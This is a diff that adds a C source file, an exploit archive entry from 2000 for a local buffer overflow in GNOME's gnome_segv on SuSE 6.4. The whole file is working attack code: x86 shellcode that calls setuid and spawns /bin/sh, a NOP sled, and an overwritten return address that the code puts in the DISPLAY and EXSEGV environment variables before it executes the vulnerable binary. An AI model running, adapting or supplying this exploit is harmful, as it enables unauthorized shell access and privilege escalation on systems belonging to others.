@@ -1,0 +1,49 @@
+/* gnome_segv local buffer overflow.
+ * 
+ * Author: Cody Tubbs (loophole of hhp).
+ * www.hhp-programming.net / pigspigs@yahoo.com
+ * 12/9/2000
+ *
+ * This exploit was coded at overfiens in cali.
+ * Shouts to overfien and skeptik... h00t h00t.
+ * Bug found by skeptik.
+ *
+ * Tested on SuSE 6.4/2.2.14
+ * non s*id by default, p.o.e. only.
+ */
+
+#include <stdio.h>
+#define DBUF   287 // 56(fun)+RET+227!
+#define OFFSET 0   // Change if fails.
+
+static char shellcode[]=
+  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+  "\x66\x31\xc0\x66\x31\xdb\xb0\x2e\xcd\x80"
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
+  "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+  "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff"
+  "/bin/sh\x69";
+
+long get_sp(void){__asm__("movl %esp,%eax");}
+main(int argc, char **argv){
+  char eipeip[DBUF]="        Don't forget to check www.hhp-programming.net";
+  char buffer[4096], heh[256+1]; // ^</tag> :D
+  int i, offset;
+  long address;
+  if(argc>1){offset=atoi(argv[1]);}
+  else{offset=OFFSET;}
+  address=get_sp()-offset;
+  for(i=56;i<DBUF;i+=4){*(long *)&eipeip[i]=address;}
+  for(i=0;i<(4096-strlen(shellcode)-strlen(eipeip));i++){buffer[i]=0x90;}
+  memcpy(heh,eipeip,strlen(eipeip));
+  memcpy(heh,"DISPLAY=",8);
+  putenv(heh);
+  memcpy(buffer+i,shellcode,strlen(shellcode));
+  memcpy(buffer,"EXSEGV=",7);
+  putenv(buffer);
+  fprintf(stderr,"Return address %#x, offset: %d.\n",address,offset);
+  execlp("/opt/gnome/bin/gnome_segv","gnome_segv",0);
+}
+
+
+// milw0rm.com [2000-12-06]
